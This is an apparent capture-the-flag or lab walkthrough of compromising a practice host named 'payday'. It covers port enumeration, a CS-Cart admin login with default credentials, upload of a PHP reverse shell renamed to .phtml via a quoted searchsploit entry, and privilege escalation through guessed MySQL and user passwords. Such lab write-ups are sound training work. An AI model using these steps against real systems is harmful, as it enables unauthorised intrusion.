
Autorecon on 192.168.228.39.

- 22/tcp  open  ssh          syn-ack ttl 61 OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
- 80/tcp  open  http         syn-ack ttl 61 Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
- 110/tcp open  pop3         syn-ack ttl 61 Dovecot pop3d
- 139/tcp open  netbios-ssn? syn-ack ttl 61
- 143/tcp open  imap         syn-ack ttl 61 Dovecot imapd
- 445/tcp open  netbios-ssn  syn-ack ttl 61 Samba smbd 3.0.26a (workgroup: MSHOME)
- 993/tcp open  ssl/imaps?   syn-ack ttl 61
- 995/tcp open  ssl/pop3s?   syn-ack ttl 61

port 22 (ssh) - tried nmap ssh brute script. Got user `vladimir intarussamee` from web. Tried ssh but failed
```
└─$ ssh vladimir@192.168.228.39         
Unable to negotiate with 192.168.228.39 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
```

port 139/445 (smb) - tried anonymous shares + enum4linux to get users. Nothing interesting.
```
└─$ smbclient -L //192.168.228.39/ -N        
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (payday server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

└─$ enum4linux-ng 192.168.228.39 -A -Gm -R -t 15
```

port 110/995 (pop3) - I don't really know how to enumerate this but I ran the bottom two scripts. Nothing interesting.
```
nmap --script "pop3-capabilities" -sV -p 110,996 192.168.228.39
PORT    STATE  SERVICE  VERSION
110/tcp open   pop3     Dovecot pop3d
|_pop3-capabilities: TOP RESP-CODES SASL UIDL PIPELINING CAPA STLS
996/tcp closed xtreelic
nmap --script "pop3-ntlm-info" -sV -p 110,996 192.168.228.39 
PORT    STATE  SERVICE  VERSION
110/tcp open   pop3     Dovecot pop3d
996/tcp closed xtreelic
```

port 80 web. It shows an Internet shop. `admin:admin` is a valid credential. It is running on the CS-CART template. For some reason we cannot feroxbuster this website. Add flag  --scan-dir-listings.
```
feroxbuster -u http://192.168.228.39 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
200      GET      676l     1856w    28074c http://192.168.228.39/index.php
[####################] - 1s         1/1       0s      found:0       errors:1      
[####################] - 0s     30000/30000   254237/s http://192.168.228.39/ => Directory listing (add --scan-dir-listings to scan) 

feroxbuster -u http://192.168.228.39 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt --scan-dir-listings -x php,txt,html
...
...
200      GET      215l      553w     8042c http://192.168.228.39/admin.php
200      GET      263l      634w     9483c http://192.168.228.39/admin
200      GET      219l      525w     7731c http://192.168.228.39/install
...
...
```

**Why --scan-dir-listings is needed**
From Claude: 
By default, feroxbuster has link extraction turned on (you saw `Extract Links │ true`). When it hits a page that it detects _is_ a directory listing, its reasoning is basically: “the server is already showing me every file and folder in here, so I’ll just scrape those links rather than throw 30,000 wordlist guesses at a directory whose contents are sitting right in front of me.” So it extracts what’s visible and **declines to brute-force into that path.** That’s the behavior the hint was flagging.
`--scan-dir-listings` overrides that and says “brute-force these directories anyway, even though they’re listings.” You’d want that when you suspect there are files _not_ shown in the index — something readable by path but excluded from the listing, or hidden by naming.


Go to this admin site as we have `admin:admin` and this seems oddly suspicious. We landed on the site named CS.CART but there are more options here compared to the index page. Searchsploit `cs cart` and we find an RCE telling us what to do.
```
# Exploit Title: CS-Cart authenticated RCE
# Date: 2020-09-22
# Exploit Author:  0xmmnbassel
# Vendor Homepage: https://www.cs-cart.com/e-commerce-platform.html
# Tested at: ver. 1.3.3
# Vulnerability Type: authenticated RCE



get PHP shells from
http://pentestmonkey.net/tools/web-shells/php-reverse-shell
edit IP && PORT
Upload to file manager
change the extension from .php to .phtml
visit http://[victim]/skins/shell.phtml --> Profit. ...!
```
We rename out php-reverse-shell to `.phtml` and uploaded to the skin directory. Launch it and we caught a reverse shell on our penelope. 

## Privesc

check for suid and capabilities but nothing really interesting.

Tried running linpeas.sh but it crashes.

Check listening ports. Looks like mysql is running.
```
www-data@payday:/$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name   
tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN     -                   
tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN     -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     -                   
...
```

Login with credentials `root:root`
```
mysql -u root -p --skip-ssl
Enter password: root
use mysql; 
select * from user;

*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
```
Obtain root password which don't work. Maybe its encrypted or something.

Tried `patrick:patrick`. Logged into patrick account. Patrick has all sudo rights.
```
patrick@payday:/$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for patrick:
User patrick may run the following commands on this host:
    (ALL) ALL

patrick@payday:/$ sudo -i
```
Obtain root with `sudo -i`.